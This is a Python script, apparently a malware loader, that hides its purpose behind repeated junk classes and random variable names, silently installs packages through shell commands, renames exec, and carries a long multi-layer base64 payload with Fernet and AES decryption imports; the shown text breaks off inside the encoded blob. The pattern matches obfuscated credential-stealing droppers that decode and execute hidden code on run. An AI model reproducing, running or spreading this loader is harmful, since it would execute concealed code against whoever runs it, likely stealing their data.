

from sys import executable, stderr
{'username': 'szeCjxa', 'age': 24}
OK5zprOJHG = 55875859
class eGlaSLUWdF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RFsrZQdtWQ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Ti2X7Y521E = 23600745
AbJDmG9B8u = 19935358
class sdAkUQ8cHT:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'gfHaYdafEZ'", "'y2RxfvuMW0'", "'WCTAxbZnDZ'", "'DX6NVPr1pS'", "'pE9f8wxhlJ'"]
class obNoDtjRx3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class PVULTzh89a:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mrKidpjicw:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xV478jUQBt = 23747526
class S552uX8Ils:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
x6QyQTY4CA = 7831170
class wDoABzZQ4y:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ZJjaMzyYmj = 33497629
Qrg2AcEK18 = 11190430
class kI2POOmnZ6:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class OmlcDYMjeK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hUco2bSSX3'
QstHDmbB2e = 29478657
veJaLeXaTg = 86145784
ycS6diVEVI = 61119508
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
{'username': 'szeCjxa', 'age': 24}
OK5zprOJHG = 55875859
class eGlaSLUWdF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RFsrZQdtWQ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Ti2X7Y521E = 23600745
AbJDmG9B8u = 19935358
class sdAkUQ8cHT:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'gfHaYdafEZ'", "'y2RxfvuMW0'", "'WCTAxbZnDZ'", "'DX6NVPr1pS'", "'pE9f8wxhlJ'"]
class obNoDtjRx3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class PVULTzh89a:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mrKidpjicw:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xV478jUQBt = 23747526
class S552uX8Ils:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
x6QyQTY4CA = 7831170
class wDoABzZQ4y:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ZJjaMzyYmj = 33497629
Qrg2AcEK18 = 11190430
class kI2POOmnZ6:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class OmlcDYMjeK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hUco2bSSX3'
QstHDmbB2e = 29478657
veJaLeXaTg = 86145784
ycS6diVEVI = 61119508
CSelYFNpYAX4jhfMiUEQGWQ3MocchTDMzojPWD = exec
{'username': 'szeCjxa', 'age': 24}
OK5zprOJHG = 55875859
class eGlaSLUWdF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RFsrZQdtWQ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Ti2X7Y521E = 23600745
AbJDmG9B8u = 19935358
class sdAkUQ8cHT:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'gfHaYdafEZ'", "'y2RxfvuMW0'", "'WCTAxbZnDZ'", "'DX6NVPr1pS'", "'pE9f8wxhlJ'"]
class obNoDtjRx3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class PVULTzh89a:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mrKidpjicw:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xV478jUQBt = 23747526
class S552uX8Ils:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
x6QyQTY4CA = 7831170
class wDoABzZQ4y:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ZJjaMzyYmj = 33497629
Qrg2AcEK18 = 11190430
class kI2POOmnZ6:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class OmlcDYMjeK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hUco2bSSX3'
QstHDmbB2e = 29478657
veJaLeXaTg = 86145784
ycS6diVEVI = 61119508
import concurrent.futures
PZcTmMLNDhGxIyuHWAnzp4HJYLcvrDIwkJzqlN="CmltcG9ydCB0aW1lCnsndXNlcm5hbWUnOiAnc3plQ2p4YScsICdhZ2UnOiAyNH0KT0s1enByT0pIRyA9IDU1ODc1ODU5CmNsYXNzIGVHbGFTTFVXZEY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgUkZzclpRZHRXUToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKVGkyWDdZNTIxRSA9IDIzNjAwNzQ1CkFiSkRtRzlCOHUgPSAxOTkzNTM1OApjbGFzcyBzZEFrVVE4Y0hUOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpbIidnZkhhWWRhZkVaJyIsICIneTJSeGZ2dU1XMCciLCAiJ1dDVEF4YlpuRFonIiwgIidEWDZOVlByMXBTJyIsICIncEU5Zjh3eGhsSiciXQpjbGFzcyBvYk5vRHRqUngzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIFBWVUxUemg4OWE6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIG1yS2lkcGppY3c6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCnhWNDc4alVRQnQgPSAyMzc0NzUyNgpjbGFzcyBTNTUydVg4SWxzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCng2UXlRVFk0Q0EgPSA3ODMxMTcwCmNsYXNzIHdEb0FCelpRNHk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKWkpqYU16eVltaiA9IDMzNDk3NjI5ClFyZzJBY0VLMTggPSAxMTE5MDQzMApjbGFzcyBrSTJQT09tblo2OgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBPbWxjRFlNamVLOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCidoVWNvMmJTU1gzJwpRc3RIRG1iQjJlID0gMjk0Nzg2NTcKdmVKYUxlWGFUZyA9IDg2MTQ1Nzg0CnljUzZkaVZFVkkgPSA2MTExOTUwOAppbXBvcnQgemxpYgppbXBvcnQgYmFzZTY0CnsndXNlcm5hbWUnOiAnc3plQ2p4YScsICdhZ2UnOiAyNH0KT0s1enByT0pIRyA9IDU1ODc1ODU5CmNsYXNzIGVHbGFTTFVXZEY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgUkZzclpRZHRXUToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKVGkyWDdZNTIxRSA9IDIzNjAwNzQ1CkFiSkRtRzlCOHUgPSAxOTkzNTM1OApjbGFzcyBzZEFrVVE4Y0hUOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpbIidnZkhhWWRhZkVaJyIsICIneTJSeGZ2dU1XMCciLCAiJ1dDVEF4YlpuRFonIiwgIidEWDZOVlByMXBTJyIsICIncEU5Zjh3eGhsSiciXQpjbGFzcyBvYk5vRHRqUngzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIFBWVUxUemg4OWE6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIG1yS2lkcGppY3c6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCnhWNDc4alVRQnQgPSAyMzc0NzUyNgpjbGFzcyBTNTUydVg4SWxzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCng2UXlRVFk0Q0EgPSA3ODMxMTcwCmNsYXNzIHdEb0FCelpRNHk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKWkpqYU16eVltaiA9IDMzNDk3NjI5ClFyZzJBY0VLMTggPSAxMTE5MDQzMApjbGFzcyBrSTJQT09tblo2OgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBPbWxjRFlNamVLOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCidoVWNvMmJTU1gzJwpRc3RIRG1iQjJlID0gMjk0Nzg2NTcKdmVKYUxlWGFUZyA9IDg2MTQ1Nzg0CnljUzZkaVZFVkkgPSA2MTExOTUwOApmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSwgc3RkZXJyCgoKdHJ5OgogICAgaW1wb3J0IGNyeXB0b2dyYXBoeQpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBzdWJwcm9jZXNzLnJ1bigncHl0aG9uIC1tIHBpcCBpbnN0YWxsIGNyeXB0b2dyYXBoeScsIHNoZWxsPVRydWUpCiAgICBmcm9tIGNyeXB0b2dyYXBoeS5mZXJuZXQgaW1wb3J0IEZlcm5ldAoKaW1wb3J0IHN1YnByb2Nlc3MKZnJvbSBpbXBvcnRsaWIgaW1wb3J0IGltcG9ydF9tb2R1bGUKCnJlcXVpcmVtZW50cyA9IFsKICAgIFsicmVxdWVzdHMiLCAicmVxdWVzdHMiXSwKICAgIFsiQ3J5cHRvZG9tZS5DaXBoZXIiLCAicHljcnlwdG9kb21leCIgaWYgbm90ICdQeXRob25Tb2Z0d2FyZUZvdW5kYXRpb24nIGluIGV4ZWN1dGFibGUgZWxzZSAncHljcnlwdG9kb21lJ10KXQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6CiAgICB0cnk6CiAgICAgICAgaW1wb3J0X21vZHVsZShtb2R1bGVbMF0pCiAgICBleGNlcHQ6CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihleGVjdXRhYmxlICsgIiAtbSBwaXAgaW5zdGFsbCAiICttb2RsWzFdLCBzaGVsbD1UcnVlKQogICAgICAgIHRpbWUuc2xlZXAoMykKCmltcG9ydCByZXF1ZXN0cwoKZnJvbSBjcnlwdG9ncmFwaHkuZmVybmV0IGltcG9ydCBGZXJuZXQgYXMgaFhSR0RHQ1BUclJ2Ynp3YVVsRmJtUUNvRDhPQ1k0cmpZQ094TjUKCnRyeToKICAgIGZyb20gQ3J5cHRvZG9tZS5DaXBoZXIgaW1wb3J0IEFFUwpleGNlcHQ6CiAgICBzdWJwcm9jZXNzLlBvcGVuKGV4ZWN1dGFibGUgKyAiIC1tIHBpcCBpbnN0YWxsIHB5Y3J5cHRvZG9tZSAiLCBzaGVsbD1UcnVlKQogICAgZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKICAgIAplbmNvZGVkX2NvZGUgPSAiWjBGQlFVRkJRbTB3ZEZWdFJrSjZkVGhzWXpWNVFrWnZUblJRUTNoRVJIQnFhazVJWVZkRFZGQktYMjQ1UTFWWlJIVkZWakY2VGtGT1RqZFZURmt5Y1c1eVpVUk9SRXBMYkV0bFMyMUdUMm8zUlRKM1NEWkZVRk5WTVZJdFFtbExaVzVJZURjeFRWTTVjMjVxV0VvM1N6ZzRURWc0YWpWUVJrOVBSWEo1UldoMFpFTjNXR2RPWWtSVFF6WTRiMVZpYW5weU9IUjVVbk4wTkRoTVFVVmhWekIxWmpaaVNYSkdhRzFvWVVzNFNuVTJjMEowU2pKTmQyNXhSMWszWVU5c1IzbFZjM2x2Y1U1U1pXUlhWRkZWWVZOeWFsUndibEEwVTIxT1NERTFWVWgwYlZwdmFrbzNSMjkzWkRKTmEwOXlhRWMyTXpVdFFXaG5jSGhDUXpsMVozVk9SRkZyVlhVek5rRm1PVk5YYzFSbk5FMTVWWFJOYnpSd1h6Vm5SRVp0WlVGTE4wOVNNM0UzWTI5aVZuVmlXRWhtTTB0T2FtczJaRzk1Wm5KaGJrSkxiblJuTVRabWJtUk9hbk00V1hWQ2JGQk5NeTFxYzBGWFZHWlhablpUWkdkdVVrTnFTV2RXTFU5RlVYZGhhMFEwZEZkR01YUmZiWEZoZG1kWmJETlhObUZzTVhobmJIaHJWM0U1YkZrM2RYTkJTMHRuVm0xaFVtTTJjVEJxT1dSNGRXMVpNMHBtVm5SWGNqUldUbkpWUkdkMmRWbEdiR0Z1Wm14MlZHeGxlbXhmU3pOVk5WVnhiRWxIZDA0emJGVnhPRXBZWDI5aU0xSnFRVXBqVTE5b1oxOUxNbGhZY0RZMlFVUnRWSGxMT1hSRFNsQkpTMUJ1YldzeWVsRmhaM3BPTFU5UlIwcElhVTUwYlcxMmQyVklRM3AwTXpkWlNYY3RZbEJSTVc0MFRFUmFWR05zYm1WQ01XNUhXVkZZV25ZMWIwa3pUV2RQVVU0d2MzWjRka05QU0VOWE9UUnNUVmR4WDFoVWVrdFJjR3RxZVd3NWVHOTRjMGsyT0dWWWVEVlJkWGhVYlZFd1p6TkRja2czZFU5U01rUnBaMlZTVW1wVlFrWlBXbWN4Y2xWYVFYUlZNbWxKZFVGcVZ5MUZOVXRsUm1GRVlXZFRSRWxYVlVoTk9ITkxRbDlYYkU5ZlRFMVhZa0ZOZEhORWNWaHNjbTF2VnpRelMxUXljbTB5Y2taSFEwb3dOVEpyYUcwNFUxcE1OMVZOTFhNMmFEbDBObVUwUTJsYVNtbzVOblZpUkdoUFVrTTVSbGRITjJoVGQyZDZkRk13ZVMxMGFFcEhaVzVLTWtKZlJHVkdkSEZtVlV4TlVtMUZSMFZXUlhWSmNuSTRiVk5hZEZSdVUwcHNWemw0UlhwV1pFaGthbVpTYjI5blVVaEZia1p0WlZOVWMyOTVUWE5ZZDJGNk9VVjFlVGhaTUVSM01qSmxNSFZrYVRWUFYwbHFUVEV5ZUV4NlptVktVMnRoZFhaQ1EzVk1VMGhqY2tOVVlUVXhaM1pWWlhSWlFuZHhXbVk1V2tab1NHdFdiM014TUVzdFoyWnRWa3RqWTJsSGFsbG9UMGd6ZUMxSmJVNUZOVEYyU0VwSmQzTnlYMEpsY1VSRloyVjBZMU5EVkZwNE16bDZaRE5rYWxGSFZrbDNUemRrVDJGMGVVaEdUV3d3YkdoaFkwUnNZVEJKVTFnd1ZITnVWMGxoTW5oVVFYbDFla1J1V21RNFpHWjVWMnhpY0cxU2ExZEdPR053WkRaNFExSnJORFpSVkRCR09GRnFiVnBLYmpCbGNHdHdRa3hSUW5Fd2RISlBXV3hHVmxwQllWUlRUakUxYVRCUlh6QllhV0ZzUjJNNVJsWlBZMjR0WVVGc1RISkVPWFpQT0ZjME9HWTRSRGhDWkdaWWVtZHFPR2RaZFROb1EzTmxUVzF1WTJSTU9HOXVVblZtVDFoWVVFUkNTbWRMWjNSMFRVSkZiVWhFUjFGTGQyWTVVa2xJVkhkak5IVm9hRGRXYm5CcVJXOVNYMUZQVjJ4RmRXSnNPRXhMVkV0ZmFpMXJZbWRXWmpGM04wUXdOMDF4Y1ZWWVVrWkNVMEp1ZGxBM1VWRjZRMFUwVjI1NU9VMUZVMGxHUm1Gd1FqaEZXWHBvU21wVFltRjNWbk5SUjFONVFUbHdjazV2ZUV0alRERldMVGxLYkZVMVFqRjRSVGhEWWtKNk1VSlJZMU5CTjFGMk9WSTVUMjB5V1hWc1ZrTTFRbVEwWTBKUmNXVlpOREpaY0ZCT2NWZDFkamxoWHpKVVFXSjJSWGxCUzJKcVUwTkVZakpTVUhsS00wcFBXRFZmTlhkaFdrTkZhVTFHV1U5QloydENURFJwVFRCMVNuSkphMDFCZG05aGVYb3dWVmhFYUZJMFJtOTJaVzlFTVdZNFdHSklaRWxYTlVjd2VFVnFaRWMwY2xGWk5URnBSV05rVDJ0R1JUUlNjMWRKUjIxVE0zcHRTMU4xYldSNlRuTjZRMGs1TlY5b1ZrVTFiSGxmWmxKVldta3RSekI0Yld4YWQyeENXbVJsTXkxdFVFOVdibmhCVm5wNFJXdFBjMWxsTVZvM2R6ZHBjbkZhTXpCTk1VSklkV1I0YW05bVdFUmxkWFZHYVdKdVVrRjJZVWd6WlVzMlRFdGFTM1ZsWVhWdkxVcE5kME15VTBOVE9VVmlaRFZmWVdJeVMxVjJNREF3VEdseVEyRm5UMWRhYlZOTVVFcERVa2xGZFcxRFJEQm9jbVI2VUZONWJrNWpSV3BuVjJSRFoyWnJTSGRhUlhoMlpUQlFaMkl3YjNWc1RXMVZiMlZ5VHpoc2JsSmlZaTB5VDJKd2EyWmZWVVUzT1dkdU9WWk9VRzFTU25OVVRYWlZWbVoxVkVGRE0yeFVhakZHVUdoNGNuWklUREpIU25GWU1VeFZWbDkxY0hkbVVuRmZOR2h6U0ZNMmJEVldXbDkyYVRaUFRrdHhUV2hMTTFwdlRGQldTVUpPWWpKNU1GUkpjMjVCUTNnMGR6QnlMWGxsVTBWck9HRmlUMDVETVUwMlVVazNaMFI0YWxCVVVHRkRXbWh3YW5oa01VcGlabVZKU0hNd1pGaHFXazg0U1VjeGFIRm1UM1JFUzNWeGIxODBWVXRyWlRkdWNUTXRSVVZGZDAxcGJWQllZa2xOVTBVM04yNUJWQzFwZW5KRE9HdERhRGQzVFhNemFTMWZSRlZsUzI5d01IZFVaR1pZY1dGR1UyZDZTREJ6U0RaVkxVRXlVRlo1WVZZeVpXeE9OVTlmWlhKV1oyOHhTVmhITW1VNWNVaFdkbmRhYW5OSlZGRm9aMVV0UTNSVmRIZDRhRFZMVDNkaU5HcHpiRTg0VlhST05ETlFTV1JhVUc5eWIwWTVUVEEyZVV4MGRGbE5TM0ZqTVdwd2NHNTRZVmRpVTBoeldtOVRNM2swU0hwR01uQnRYMjF2VG1SRU9GOWlTamQ1UkdzMGJtNVBiMHBJTWpCM09HbHhUekJhTUdsVVdtbGpOblJsZGtSWVNuUk1iakl3V1ZvNGVrNVdYM05QYWtoWk5HMDRRVlZ3TTI5b0xXTjJjMWxVZUU1RFZGaHJSVk5SV2twMGJrazFTMEpHTUdaZlUxcE5UMVpaV1doMWVrTnpSa1pPUm5vMmJHNWZVSE15YWpGd1YzUk9VVWRSZDJsUlEwdHJXVk5PWm14aFUwaHhVbkJ6T1hsSVEwcFJUbWRuWjJacVRYVjNNbVY1Y1ZvNWNrTTBXRWhuTlhobFNWZzBZMmxhZFMxRFdWVmpOblJEVWxKVmJuQnJWVk5yUjA5aE5tTm1Wa3AzUzFsMVdFWmtOVXBhT1dadlQyaGxVWGc1Y0U1bFNEaFVkMnhvTVc5eVVuVklWa2RVV0U1Tk5HRTNkMFJPVm1kcGQwTjZPVlphV2tScmNYUnJiWEJCYXpBNE5WSk5WMjlsV2s1cFFsWTVaRUo1WjJndE1YaGxhbkI2UkZsMlkxbFdaREpaZFhoQ2RVWllaalJoVG5GeFpsTlVlVEJWWTFBM01rTTJSMDl2Ym1WelZUWXdNa0pEZFV0dk5VdHVaWEZ3Y1hCYVFsWktkRXhoYUdaalRrSXpORzlrZEdvd1JYaFdNMHhmTjFWV1psSnhjMmhKY0Vzd2RuUm9lV3RUYVZaUWFVUjRkbGxLVFhNNFVtNUljR3N5VURkNVNVVlFNazFNTlRkMVR6WllWa1ZYVWpoVWR6RlVVMVEzWkZsS1ZYQlZiUzFCWTJGSFkxUlNkWFJpUWpWMWFqVkRRMGs0WldWaVluUldabGhtTkdKV2RFeDZVMDk2U0cxdGJYTkViWFJzTWtGTWRrVnNZVUZ3WWpoMFdYUkVlbFpTWVRZM1VFd3pVV1ZhYUhKMFRFVXpUVXRwVkhaNGJUSjJNek5LZVhaeFpqaEtPRlJHVDNBellUbHVTRFoyTlMxV2R6WkxMVXh1Vkd0Ulp6aDRja0ZCVW5OSE5EWkRhMWswYkhKZk1HUXROMTlPWmpKV1dWSkdlRjlXTFV0UWQyNWxWblpqWlZveldUUjJRM2h2UmtReWF5MWlkV2MwZVdWYWNYUkZZMGhzUWxNNFJYaEdUMWhKYmtsVmQwSldRM0pDY1MwNWFVMUJkRlI2ZWt0NWVHUlRjWFF6YkV4aGRFcERNMmhtTVdwTkxVRmlaRWhyTm5kdFJ6YzVNRzFFZHpoWmFsRllMVk14YUMweVQxVnhhWGM0UWpVeldtWTRTekJQZWt0U1NVeEVMWGsyUWpGeGR6TlRjRGN6YW0xemRrdExRM0U0VVRRelRUVlRTR1JSTVRnNFdVVlRXWHBpUlVsNFNuSk9jRlJSY0ZKdk9IVkpWa2R2ZDJkZllXTnNjakJUUlRaSk9HNVhhbkpTVjBWbk1VRnhkWGROZDIxeldWcFZTRTVGV0d0RVpWQmpPR2xuVlcxRVEyUXdRbGhoTVdWMGVFRlBSRVp3ZWtKTFZ6RXRPR05UYlVSa05ETXRNVEo1YTBSc2F6UnVVMmxyUkVzd1gwbExVV2xNUlhOUVkzYzVZbTgzU21ZeGJrdEZRbU55YTFaeU5tRjZkMVl5ZVY5VGFYVk9iVGwwV1RGUU9VeHNTbEJ0TWtWSloyaDFhME14UzAweVVYaEVObmQxZGw5M2JrNXFjR3c0Y0ZFeWJHSkhSRTFTUldwMk9ETjRkV00xZFZCSldDMXlVbU4xWlRCdWVtczRaR0kyUlhabGEwTjJSMFJsVG5OQ1VVdGtSRUoxWHpaUFl5MU5kRVV0UTJneWVFbHdTSHBxVjBrMlJHVTNNV2c1UVhWc1EzTm1iRm8zVFhGc2RYbGthRTAyUkhSS2RFMHRXbUV4VDJWcmFrOXVVbXhtWDJNNU5rSmlOVWxHYTNKR01HTXhNVmsxVkV4VVQwWjBVMEZqVDJSbFYwWk1OSHBXTkRaaVNFbzJOMU5hWTFSUU16Vmpha2RGY0UxRGFtTkZjVUZoZGxoVmFHSndNMnhJUVVoUE1pMWFSVTQxUms5c1kzUlBhbXRhTkZKbmFHZ3lObWcwUlhwRFIwazBXRFYzVnpkUmVFb3dRME16U0haTlMwWk5kVk5xVmpaTmVFMXFSMWxDZVRGS1l6SlhlbnBhT0c4eFNGbEpZalJMVGpSVE1GTnRVelV6U0ZVNVExSTFZbU5aTFVwblNYQllOVkp6TVUwNE5rbGhTMjEwUzNoZlNURmtWamxKTUdaelExUkdhWFZpYURGRmFVNUZNV1V5IgpDU2VsWUZOcFlBWDRqaGZNaVVFUUdXUTNNb2NjaFRETXpvalBXRCA9IGV4ZWMKZW5jcnlwdGVkX2NvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfY29kZSkKeyd1c2VybmFtZSc6ICdzemVDanhhJywgJ2FnZSc6IDI0fQpPSzV6cHJPSkhHID0gNTU4NzU4NTkKY2xhc3MgZUdsYVNMVVdkRjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBSRnNyWlFkdFdROgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpUaTJYN1k1MjFFID0gMjM2MDA3NDUKQWJKRG1HOUI4dSA9IDE5OTM1MzU4CmNsYXNzIHNkQWtVUThjSFQ6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhClsiJ2dmSGFZZGFmRVonIiwgIid5MlJ4ZnZ1TVcwJyIsICInV0NUQXhiWm5EWiciLCAiJ0RYNk5WUHIxcFMnIiwgIidwRTlmOHd4aGxKJyJdCmNsYXNzIG9iTm9EdGpSeDM6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgUFZVTFR6aDg5YToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgbXJLaWRwamljdzoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKeFY0NzhqVVFCdCA9IDIzNzQ3NTI2CmNsYXNzIFM1NTJ1WDhJbHM6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKeDZReVFUWTRDQSA9IDc4MzExNzAKY2xhc3Mgd0RvQUJ6WlE0eToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpaSmphTXp5WW1qID0gMzM0OTc2MjkKUXJnMkFjRUsxOCA9IDExMTkwNDMwCmNsYXNzIGtJMlBPT21uWjY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIE9tbGNEWU1qZUs6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQ